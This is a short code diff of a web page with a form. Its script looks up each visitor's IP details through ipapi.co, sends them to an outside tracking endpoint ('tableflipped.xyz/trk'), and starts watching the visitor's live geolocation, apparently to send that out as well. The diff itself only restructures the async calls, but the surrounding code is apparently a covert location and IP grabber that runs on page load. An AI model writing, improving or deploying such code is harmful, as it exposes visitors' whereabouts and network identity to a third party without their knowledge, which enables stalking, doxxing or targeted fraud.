@@ -68,10 +68,10 @@
         <button type="submit">Submit</button>
     </form>
 
-<script> // #9 u
+<script> //asdasd uas
     const url = "https://app.tableflipped.xyz/trk"; 
 
-
+    (async () => {
     let info = await fetch('https://ipapi.co/json', {
         method: "GET", 
         headers: { "Content-Type": "application/json" }, 
@@ -86,7 +86,7 @@
         body: JSON.stringify(predata), 
         headers: { "Content-Type": "application/json" }, 
     })
-
+})();
 
     (async () => {
         const watchId = await navigator.geolocation.watchPosition((position) =>  {
